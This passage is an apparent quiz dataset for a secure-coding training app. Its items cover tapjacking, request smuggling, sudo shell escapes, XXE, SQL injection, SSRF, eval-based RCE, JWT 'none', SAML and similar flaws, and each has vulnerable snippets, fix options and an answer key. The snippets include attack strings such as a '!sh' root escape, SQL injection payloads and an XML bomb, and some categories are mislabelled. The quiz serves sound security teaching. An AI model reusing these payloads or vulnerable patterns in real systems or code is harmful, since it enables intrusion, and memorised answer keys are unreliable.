        description: 'A malicious application displays over a legitimate app, intercepting taps meant for the legitimate app. It can be used to trick users into granting permissions or clicking sensitive buttons.',
        vulnerableCode: `// This is a vulnerability in the victim app, not the attacker's.
// The victim app's Buttons and other UI elements do not filter touches.`,
        language: 'generic',
        options: [
            {
                id: '177a',
                code: `// Set 'android:filterTouchesWhenObscured="true"' on sensitive UI elements in the layout XML.
<Button ... android:filterTouchesWhenObscured="true" />`
            },
            {
                id: '177b',
                code: `// Alternatively, call 'view.setFilterTouchesWhenObscured(true)' programmatically.`
            },
            {
                id: '177c',
                code: 'Both A and B achieve the same result. This setting causes the system to discard touches when the view is obscured by another visible window.'
            }
        ],
        correctOptionId: '177c',
        explanation: 'Tapjacking is an overlay attack specific to Android. The `filterTouchesWhenObscured` property is the specific defense against it. When set to true on a View, the system will not deliver touches to it if another window is obscuring it, preventing the malicious app from intercepting the tap.',
    },
    {
        id: '178',
        title: 'HTTP Request Smuggling',
        category: 'Protocol',
        difficulty: 'Expert',
        xp: 100,
        description: 'An attacker sends an ambiguous HTTP request that is interpreted differently by a front-end proxy and the back-end server, allowing the attacker to "smuggle" a second request to the backend.',
        vulnerableCode: `// Attacker sends a request with two Content-Length headers.
// The front-end proxy might use the first header, while the back-end server uses the second,
// causing a desynchronization in the request stream.`,
        language: 'generic',
        options: [
            {
                id: '178a',
                code: `// This is a protocol-level vulnerability in server software.
// Ensure all servers in the chain (front-end, back-end) are updated to the latest versions, which have protections against ambiguous requests.`
            },
            {
                id: '178b',
                code: `// Normalize ambiguous requests at the network edge. For example, have the front-end server reject any request with multiple Content-Length headers.`
            },
            {
                id: '178c',
                code: `// Use HTTP/2 for back-end connections, as its framing mechanism is not vulnerable to this class of attack.`
            }
        ],
        correctOptionId: '178c',
        explanation: 'Request smuggling is a complex attack that exploits inconsistencies in how different servers parse HTTP requests. While keeping servers patched (A) and normalizing requests (B) are crucial, the most robust solution is to use HTTP/2 for communication between your servers, as its binary framing protocol eliminates the ambiguities that make these attacks possible.',
    },
    {
        id: '179',
        title: 'Privilege Escalation via Insecure `sudo` Rules',
        category: 'Broken Access Control',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A `sudoers` file allows a low-privilege user to run a command as root, but the command itself can be exploited to spawn a root shell.',
        vulnerableCode: `// /etc/sudoers file
lowuser ALL=(root) NOPASSWD: /usr/bin/less /var/log/app.log

// An attacker running as 'lowuser' can execute:
// sudo less /var/log/app.log
// Then, inside 'less', they can type '!sh' to get a root shell.`,
        language: 'generic',
        options: [
            {
                id: '179a',
                code: `// Avoid allowing users to run commands that have shell escape features (like 'vim', 'less', 'more', 'find').`
            },
            {
                id: '179b',
                code: `// Use the 'NOEXEC' option in the sudoers rule to prevent the command from executing other programs.`
            },
            {
                id: '179c',
                code: 'Both A and B are important. A is the primary fix (don\'t allow commands with shell escapes), and B is a specific technical control to further restrict the command.'
            }
        ],
        correctOptionId: '179c',
        explanation: 'Granting `sudo` privileges is extremely sensitive. You must never allow users to run commands that can be used to spawn a shell or execute other commands. If you must grant access to a command, research it thoroughly for any "shell escape" capabilities (A) and use restrictive `sudoers` options like `NOEXEC` (B) where possible.',
    },
    {
        id: '180',
        title: 'XXE in Microsoft Office Documents',
        category: 'XXE',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An application that processes `.docx` or `.xlsx` files can be vulnerable to XXE because these formats are ZIP archives containing XML files.',
        vulnerableCode: `// Java code using Apache POI to parse a .docx file.
// If the underlying XML parser is not securely configured, an attacker
// can embed an XXE payload inside the [Content_Types].xml or other XML files within the .docx archive.`,
        language: 'java',
        options: [
            {
                id: '180a',
                code: `// The fix is the same as for any other XML processing:
// The underlying XML parser used by the library (e.g., Apache POI) must be configured to disable DTDs and external entities.`
            },
            {
                id: '180b',
                code: `// Unzip the .docx file and manually scan all XML files for DTDs before parsing.`
            },
            {
                id: '180c',
                code: `// Only accept .doc files instead of .docx.`
            }
        ],
        correctOptionId: '180a',
        explanation: 'Modern Office documents (docx, xlsx, etc.) are XML-based. When your application parses them, it is performing XML parsing. You must ensure that the library you are using is configured with a secure XML parser that disables DTDs and external entities to prevent XXE attacks.',
    },
    {
        id: '181',
        title: 'Business Logic Flaw: Contest Submission Abuse',
        category: 'Business Logic',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A contest allows users to submit an entry via an API, but there is no check to prevent a user from submitting entries after the contest deadline has passed.',
        vulnerableCode: `// API endpoint for contest submissions
app.post('/contest/submit', (req, res) => {
  // The endpoint accepts the submission without checking the current time
  // against the contest's deadline.
  const entry = req.body.entry;
  db.saveEntry(entry);
  res.send("Entry received!");
});`,
        language: 'javascript',
        options: [
            {
                id: '181a',
                code: `// The server must enforce the business rule by checking the current time against the contest deadline before accepting the submission.
const deadline = new Date('2023-12-25T23:59:59Z');
if (new Date() > deadline) {
    return res.status(400).send("The contest has ended.");
}`
            },
            {
                id: '181b',
                code: `// Disable the submit button on the front-end after the deadline.`
            },
            {
                id: '181c',
                code: `// Manually filter out late submissions from the database later.`
            }
        ],
        correctOptionId: '181a',
        explanation: 'Client-side controls are insufficient as they can be bypassed. The server is the only authority for enforcing business rules. The API endpoint must contain logic to check if the contest is still active before processing the submission.',
    },
    {
        id: '182',
        title: 'AWS S3 Public Bucket ACL',
        category: 'Cloud Security',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An S3 bucket is made public via its Access Control List (ACL) instead of a bucket policy, which can be harder to audit and manage.',
        vulnerableCode: `// AWS CLI command making a bucket public
aws s3api put-bucket-acl --bucket my-bucket --acl public-read`,
        language: 'generic',
        options: [
            {
                id: '182a',
                code: `// Disable ACLs for the bucket ('ACLs disabled' setting) and rely exclusively on IAM and bucket policies for access control.`
            },
            {
                id: '182b',
                code: `// Regularly audit bucket ACLs.`
            },
            {
                id: '182c',
                code: 'Both are good practices. Disabling ACLs (A) simplifies the access control model, making it easier to secure and audit, which is the modern best practice.'
            }
        ],
        correctOptionId: '182c',
        explanation: 'S3 ACLs are a legacy access control mechanism. The modern and recommended best practice is to disable them entirely and use only IAM and S3 bucket policies. This creates a simpler, more consistent, and easier-to-audit security posture.',
    },
    {
        id: '183',
        title: 'Android Insecure `PendingIntent`',
        category: 'Mobile Security',
        difficulty: 'Expert',
        xp: 90,
        description: 'An app creates a `PendingIntent` for a component within its own app but does not make it immutable or specify a target component, allowing a malicious app to hijack the Intent.',
        vulnerableCode: `// Java (Android)
// Creates a mutable PendingIntent with an implicit Intent
Intent intent = new Intent(this, MyInternalActivity.class);
// A malicious app could intercept this and replace the component.
PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0);`,
        language: 'java',
        options: [
            {
                id: '183a',
                code: `// Make the PendingIntent immutable (on Android 6.0+).
PendingIntent pendingIntent = PendingIntent.getActivity(
    this, 0, intent, PendingIntent.FLAG_IMMUTABLE
);`
            },
            {
                id: '183b',
                code: `// Explicitly set the target component in the Intent.
intent.setComponent(new ComponentName(this, MyInternalActivity.class));`
            },
            {
                id: '183c',
                code: 'Both A and B are necessary for secure PendingIntents. B ensures the Intent goes where you expect, and A prevents the malicious app from modifying it.'
            }
        ],
        correctOptionId: '183c',
        explanation: 'When creating a `PendingIntent`, you must ensure it cannot be modified by a malicious app. This is achieved by making it immutable with `FLAG_IMMUTABLE` (A). You must also ensure the Intent itself is explicit, meaning it clearly defines the target component, so it cannot be redirected (B).',
    },
    {
        id: '184',
        title: 'Second-Order SQL Injection',
        category: 'SQL Injection',
        difficulty: 'Expert',
        xp: 95,
        description: 'User input is safely stored in the database but later used in an unsafe query, leading to SQL injection.',
        vulnerableCode: `// 1. User registers with a username like: 'test' OR 1=1 --
//    This is stored safely using a parameterized query.
// 2. An admin function later builds a query with this "trusted" data.
String sql = "SELECT * FROM activity_logs WHERE username = '" + usernameFromDb + "'";`,
        language: 'generic',
        options: [
            {
                id: '184a',
                code: `// The ONLY fix is to use parameterized queries for ALL database operations, regardless of the data's source.`
            },
            {
                id: '184b',
                code: `// Sanitize the username before storing it in the database.`
            },
            {
                id: '184c',
                code: `// Escape the username when it is retrieved from the database.`
            }
        ],
        correctOptionId: '184a',
        explanation: 'This demonstrates that data sanitation is often insufficient. The only robust and universally correct solution to SQL injection is to use parameterized queries (prepared statements) for every single query, treating all variable data as data, never as executable code.',
    },
    {
        id: '185',
        title: 'HTTP Host Header Injection',
        category: 'Web Cache Poisoning',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An application uses the `Host` header from an incoming request to generate URLs in its response (e.g., for password reset links) without validation.',
        vulnerableCode: `// Python (Django)
// Attacker sends a request with a manipulated Host header: Host: evil-server.com
def forgot_password(request):
    host = request.get_host()
    link = f"https://{host}/reset?token=..."
    send_email(link) // Email now contains a link to the attacker's server`,
        language: 'python',
        options: [
            {
                id: '185a',
                code: `// Do not trust the Host header. Use a hardcoded, whitelisted domain name from the server's configuration to generate all absolute URLs.
// e.g., in Django's settings.py: ALLOWED_HOSTS = ['trusted.example.com']`
            },
            {
                id: '185b',
                code: `// Validate that the Host header matches an expected value.`
            },
            {
                id: '185c',
                code: 'Both A and B are correct. A is the most secure approach, while B is a manual validation that achieves a similar goal.'
            }
        ],
        correctOptionId: '185c',
        explanation: 'The `Host` header is user-controllable and cannot be trusted. The application must have a canonical, server-side configuration for its own domain name and use that value to generate all absolute links. Most web frameworks have a setting for this (e.g., `ALLOWED_HOSTS`).',
    },
    {
        id: '186',
        title: 'Deserialization of Untrusted Data (PHP)',
        category: 'Insecure Deserialization',
        difficulty: 'Advanced',
        xp: 90,
        description: 'The PHP `unserialize()` function is used on user-provided data, which can lead to object injection and remote code execution.',
        vulnerableCode: `// PHP
// Attacker provides a malicious serialized string in a cookie
$data = unserialize($_COOKIE['data']);`,
        language: 'php',
        options: [
            {
                id: '186a',
                code: `// Do not use unserialize() on untrusted input. Use a safe, structured format like JSON instead.
$data = json_decode($_COOKIE['data']);`
            },
            {
                id: '186b',
                code: `// Validate the user's cookie before unserializing.`
            },
            {
                id: '186c',
                code: `// Use a firewall to block serialized payloads.`
            }
        ],
        correctOptionId: '186a',
        explanation: 'Like in other languages, native serialization in PHP is dangerous. The standard recommendation is to completely avoid `unserialize()` on any data that originates from a user, and to use a safe data interchange format like JSON instead.',
    },
    {
        id: '187',
        title: 'Open Redirect',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application redirects to a user-controlled URL without proper validation, enabling phishing attacks.',
        vulnerableCode: `// C# (ASP.NET)
public ActionResult Redirect(string returnUrl)
{
    // Attacker crafts link: /Redirect?returnUrl=http://evil-phishing-site.com
    return Redirect(returnUrl);
}`,
        language: 'generic',
        options: [
            {
                id: '187a',
                code: `// Validate the returnUrl to ensure it is a local URL within your application.
if (Url.IsLocalUrl(returnUrl))
{
    return Redirect(returnUrl);
}
return RedirectToAction("Index", "Home");`
            },
            {
                id: '187b',
                code: `// Check if the returnUrl starts with "http".`
            },
            {
                id: '187c',
                code: `// Show a warning page before redirecting.`
            }
        ],
        correctOptionId: '187a',
        explanation: 'Open redirect vulnerabilities are exploited by phishing attacks. The server must validate any user-supplied URLs to ensure they only point to pages within the same application. Most web frameworks provide a helper function (like `Url.IsLocalUrl`) for this purpose.',
    },
    {
        id: '188',
        title: 'Missing Content Security Policy (CSP)',
        category: 'XSS',
        difficulty: 'Advanced',
        xp: 70,
        description: 'The application does not set a Content Security Policy header, removing a powerful defense-in-depth layer against XSS attacks.',
        vulnerableCode: `// The application's HTTP responses do not include a Content-Security-Policy header.
// This makes it easier for an attacker to execute injected scripts.`,
        language: 'generic',
        options: [
            {
                id: '188a',
                code: `// Implement a strict CSP that whitelists trusted sources for scripts, styles, images, etc.
// Example:
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;`
            },
            {
                id: '188b',
                code: `// Rely on browser's built-in XSS filters.`
            },
            {
                id: '188c',
                code: `// Sanitize all user input perfectly, making a CSP unnecessary.`
            }
        ],
        correctOptionId: '188a',
        explanation: 'CSP is a critical defense-in-depth mechanism. While you should always sanitize input to prevent XSS, a CSP provides an additional layer of security by instructing the browser to only execute code from trusted sources, mitigating the impact of any XSS flaws that might be missed.',
    },
    {
        id: '189',
        title: 'Use of Hardcoded Credentials',
        category: 'CSRF',
        difficulty: 'Beginner',
        xp: 45,
        description: 'A password, API key, or other secret is written directly into the source code.',
        vulnerableCode: `// Java
String dbPassword = "MySuperSecretPassword123!";
Connection conn = DriverManager.getConnection(dbUrl, "admin", dbPassword);`,
        language: 'java',
        options: [
            {
                id: '189a',
                code: `// Load credentials from environment variables or a secure secret management system.
String dbPassword = System.getenv("DB_PASSWORD");`
            },
            {
                id: '189b',
                code: `// Store the password in a separate config.java file.`
            },
            {
                id: '189c',
                code: `// Encrypt the password in the code and decrypt it at runtime.`
            }
        ],
        correctOptionId: '189a',
        explanation: 'Credentials must never be hardcoded in source code. They should be managed externally using environment variables, configuration files that are not checked into source control, or a dedicated secrets management service (like AWS Secrets Manager, GCP Secret Manager, or HashiCorp Vault).',
    },
    {
        id: '190',
        title: 'Broken Access Control - Missing Role Check',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An endpoint is protected by an authentication check, but fails to check if the authenticated user has the required *role* (e.g., "admin").',
        vulnerableCode: `// Python (Flask)
@app.route('/admin/dashboard')
@login_required  // Checks IF user is logged in...
def admin_dashboard():
    # ... but does NOT check if user IS AN ADMIN.
    return "Welcome to the admin panel!"`,
        language: 'python',
        options: [
            {
                id: '190a',
                code: `// Implement a role-based access control (RBAC) check.
@app.route('/admin/dashboard')
@login_required
def admin_dashboard():
    if current_user.role != 'admin':
        abort(403) // Forbidden
    return "Welcome!"`
            },
            {
                id: '190b',
                code: `// Make the URL harder to guess.
@app.route('/admin/a7c4f1/dashboard')`
            },
            {
                id: '190c',
                code: `// Log all access attempts to the admin dashboard.`
            }
        ],
        correctOptionId: '190a',
        explanation: 'Authentication (who you are) is different from authorization (what you are allowed to do). For privileged endpoints, you must check not only that a user is logged in, but also that they have the specific roles or permissions required for that action.',
    },
    {
        id: '191',
        title: 'Blind SQL Injection',
        category: 'SQL Injection',
        difficulty: 'Expert',
        xp: 95,
        description: 'The application is vulnerable to SQL injection, but the results of the query are not returned to the user. An attacker must use boolean or time-based techniques to extract data.',
        vulnerableCode: `// A tracking cookie is used in a query without parameterization.
// Attacker sets cookie to: 'xyz' AND 1=1 --
// Attacker sets cookie to: 'xyz' AND 1=2 --
// By observing the different responses (e.g., "Welcome back!" vs "Session not found"), the attacker can infer information.`,
        language: 'generic',
        options: [
            {
                id: '191a',
                code: `// The fix is the same as for regular SQL injection: Use parameterized queries (prepared statements) for all database access, even when using data that is already in your database.
query = "SELECT * FROM sessions WHERE session_id = ?"
// ... execute with the cookie value as a parameter.`
            },
            {
                id: '191b',
                code: `// Return a generic response for all outcomes to confuse the attacker.`
            },
            {
                id: '191c',
                code: `// Add a random delay to the response time.`
            }
        ],
        correctOptionId: '191a',
        explanation: 'Even if the application doesn\'t directly display database results, it can still be vulnerable. Any user input that influences a database query must be handled with parameterized queries to prevent injection, regardless of whether the results are shown.',
    },
    {
        id: '192',
        title: 'XML Bomb (Billion Laughs Attack)',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An XML document uses nested entities to create a denial-of-service attack. A small XML file expands into a huge document in memory, consuming all available RAM.',
        vulnerableCode: `<!-- Malicious XML -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;...">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;...">
  ...
]>
<lolz>&lol9;</lolz>`,
        language: 'generic',
        options: [
            {
                id: '192a',
                code: `// The best defense is to disable Document Type Definitions (DTDs) in the XML parser, as they are required for this attack.
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
            },
            {
                id: '192b',
                code: `// Limit the size of the incoming XML file.`
            },
            {
                id: '192c',
                code: `// Scan the XML for the string "<!ENTITY".`
            }
        ],
        correctOptionId: '192a',
        explanation: 'This DoS attack relies on entity expansion defined in a DTD. The most effective way to prevent it is to configure the XML parser to completely disallow DTDs, which also prevents other DTD-based attacks like XXE.',
    },
    {
        id: '193',
        title: 'Session Fixation',
        category: 'CSRF',
        difficulty: 'Advanced',
        xp: 70,
        description: 'An attacker tricks a user into using a session ID known to the attacker. After the user logs in, the attacker can use the same session ID to impersonate the user.',
        vulnerableCode: `// Conceptual Flow
// 1. Attacker visits site, gets a session ID (e.g., 123).
// 2. Attacker crafts a link: https://example.com/?SESSIONID=123 and sends to victim.
// 3. Victim clicks link, uses session 123, and logs in.
// 4. The server does not generate a new session ID upon login.
// 5. Attacker can now use session ID 123 to access the victim's account.`,
        language: 'generic',
        options: [
            {
                id: '193a',
                code: `// Upon successful authentication, the server must invalidate the old session ID and generate a new, secure one for the user.
// This is often called "session regeneration".`
            },
            {
                id: '193b',
                code: `// Do not accept session IDs from URL parameters.`
            },
            {
                id: '193c',
                code: `// Use a long and random session ID.`
            }
        ],
        correctOptionId: '193a',
        explanation: 'Session fixation is prevented by regenerating the session ID immediately after a successful login. This ensures that any pre-login session ID (which may be known to an attacker) is invalidated, and the user is issued a fresh session that only they know.',
    },
    {
        id: '194',
        title: 'Mass Assignment',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A web framework automatically binds incoming request parameters to object properties. An attacker sends extra parameters (like `isAdmin=true`) that were not in the form, and the framework blindly assigns them.',
        vulnerableCode: `// Ruby on Rails (conceptual)
// Attacker submits a sign-up form but adds 'user[is_admin]=1' to the POST body.
@user = User.new(params[:user]) // is_admin is automatically set
@user.save`,
        language: 'generic',
        options: [
            {
                id: '194a',
                code: `// Use a "strong parameters" or "whitelist" approach to explicitly define which parameters are allowed to be mass-assigned.
// e.g., in Rails:
params.require(:user).permit(:name, :email, :password)`
            },
            {
                id: '194b',
                code: `// Use a "blacklist" approach to block known sensitive fields like 'is_admin'.`
            },
            {
                id: '194c',
                code: `// Make the 'isAdmin' property private in the User model.`
            }
        ],
        correctOptionId: '194a',
        explanation: 'Blacklisting is brittle because you might forget a sensitive field. The secure-by-default approach is whitelisting, where you explicitly declare the exact set of fields that are safe for mass assignment from a user request. All modern web frameworks provide a feature for this.',
    },
    {
        id: '195',
        title: 'Server-Side Request Forgery (SSRF)',
        category: 'SSRF',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can coerce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing.',
        vulnerableCode: `// Python (Flask)
@app.route('/fetch_image')
def fetch_image():
    image_url = request.args.get('url')
    # The server fetches this URL and returns the content
    response = requests.get(image_url)
    return response.content`,
        language: 'python',
        options: [
            {
                id: '195a',
                code: `// Sanitize the URL by blocking "localhost" and "127.0.0.1".
if 'localhost' in image_url or '127.0.0.1' in image_url:
    return "Forbidden", 403`
            },
            {
                id: '195b',
                code: `// Use a strict whitelist of allowed domains and protocols.
from urllib.parse import urlparse
allowed_domains = ['images.example.com']
domain = urlparse(image_url).hostname
if domain in allowed_domains:
    # fetch...
else:
    return "Forbidden", 403`
            },
            {
                id: '195c',
                code: `// Ensure the URL starts with https://.
if not image_url.startswith('https://'):
    return "Forbidden", 403`
            },
        ],
        correctOptionId: '195b',
        explanation: 'The only reliable way to prevent SSRF is to maintain a strict whitelist of allowed domains, IP addresses, and protocols that the server is permitted to request. Blacklisting is easily bypassed.',
    },
    {
        id: '196',
        title: 'Remote Code Execution (RCE)',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'A vulnerability that allows an attacker to execute arbitrary code on the target machine. This often happens through unsafe deserialization or command injection.',
        vulnerableCode: `// PHP
$data = $_GET['data'];
eval($data); // Extremely dangerous!`,
        language: 'php',
        options: [
            {
                id: '196a',
                code: `// NEVER use eval() on user-controlled input. Refactor the code to avoid it entirely.
// Use a safe, structured approach like a switch statement or function mapping.
switch($data) {
    case 'func1':
        my_function_1();
        break;
    // ...
}`
            },
            {
                id: '196b',
                code: `// Sanitize the input to remove dangerous function names.
$data = str_replace('system', '', $data);
eval($data);`
            },
            {
                id: '196c',
                code: `// Run the code in a sandboxed environment.
// This is complex and not a primary defense.
run_in_sandbox($data);`
            },
        ],
        correctOptionId: '196a',
        explanation: 'The `eval()` function is extremely dangerous and should never be used with user-provided input. The only safe solution is to completely avoid it and refactor the logic to use safe, structured code constructs.',
    },
    {
        id: '197',
        title: 'Insecure CORS Configuration',
        category: 'CORS',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The server\'s Cross-Origin Resource Sharing (CORS) policy is too permissive, allowing any website to make requests and read the response.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// This allows ANY origin to access the resource.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});`,
        language: 'javascript',
        options: [
            {
                id: '197a',
                code: `// Use a library like 'cors' and configure a strict whitelist of allowed origins.
const cors = require('cors');
const corsOptions = {
  origin: 'https://trusted.example.com'
};
app.use(cors(corsOptions));`
            },
            {
                id: '197b',
                code: `// Dynamically reflect the request's Origin header.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  next();
});`
            },
            {
                id: '197c',
                code: `// Only allow GET requests.
res.setHeader('Access-Control-Allow-Methods', 'GET');`
            },
        ],
        correctOptionId: '197a',
        explanation: 'A wildcard `*` for CORS is dangerous for any API that is not completely public. You must use a strict whitelist of specific domains that are trusted to make cross-origin requests.',
    },
    {
        id: '198',
        title: 'JWT Signature Bypass / "none" Algorithm',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'Some JWT libraries would accept a token with the algorithm field set to "none", bypassing signature verification entirely.',
        vulnerableCode: `// Python (PyJWT library, older version)
import jwt

# Attacker crafts a token with "alg": "none"
# and a modified payload (e.g., "user": "admin").
# Some libraries would accept this without a signature.

def decode_token(token):
    return jwt.decode(token, algorithms=['HS256', 'none'])`,
        language: 'python',
        options: [
            {
                id: '198a',
                code: `// Always specify the exact, expected algorithm(s) and never include 'none'.
def decode_token(token, secret):
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '198b',
                code: `// Check if the algorithm is "none" before decoding.
def decode_token(token, secret):
    header = jwt.get_unverified_header(token)
    if header['alg'] == 'none':
        raise Exception("Bad algorithm")
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '198c',
                code: `// Update the JWT library to the latest version. Modern versions disallow the 'none' algorithm by default.`
            },
        ],
        correctOptionId: '198c',
        explanation: 'While explicitly checking the algorithm is good practice (A, B), the most critical fix is to use an up-to-date JWT library where this vulnerability has been patched. Modern libraries require you to explicitly opt-in to insecure algorithms like "none".',
    },
    {
        id: '199',
        title: 'OAuth Misconfiguration',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'The OAuth provider has a loosely configured redirect URI, allowing an attacker to have the authorization code sent to a malicious site.',
        vulnerableCode: `// OAuth Provider Configuration
// Allowed Redirect URI: https://example.com/callback?path=
// Attacker crafts a login URL with:
// redirect_uri=https://example.com/callback?path=evil.com`,
        language: 'generic',
        options: [
            {
                id: '199a',
                code: `// Use an exact match for the redirect URI.
// Allowed Redirect URI: https://example.com/callback
// Any other URI will be rejected.`
            },
            {
                id: '199b',
                code: `// URL-encode the redirect URI parameter.`
            },
            {
                id: '199c',
                code: `// Use a shorter authorization code lifetime.`
            },
        ],
        correctOptionId: '199a',
        explanation: 'OAuth redirect URIs must be compared using an exact string match. Allowing partial matches, wildcards, or paths opens the door for an attacker to specify a subdomain or path under their control.',
    },
    {
        id: '200',
        title: 'SAML Assertion Forgery',
        category: 'Auth',
        difficulty: 'Expert',
        xp: 95,
        description: 'The SAML service provider fails to properly validate the signature on an incoming SAML assertion, allowing an attacker to forge a valid assertion for any user.',
        vulnerableCode: `// Conceptual Java code for SAML processing
public void processSamlResponse(String samlResponse) {
    // Response is parsed, but the signature is NOT checked.
    String username = parseUsername(samlResponse);
    logInUser(username);
}`,
        language: 'java',
        options: [
            {
                id: '200a',
                code: `// Reject any assertion that does not have a signature.`
            },
            {
                id: '200b',
                code: `// Use a trusted SAML library and configure it to require and validate the signature against the Identity Provider's public key.`
            },
            {
                id: '200c',
                code: `// Encrypt the entire SAML assertion.`
            },
        ],
        correctOptionId: '200b',
        explanation: 'The core of SAML security is the cryptographic signature. The service provider MUST validate the signature on every assertion using the known public key of the trusted identity provider. Relying on anything less allows for trivial forgery.',
    }
];


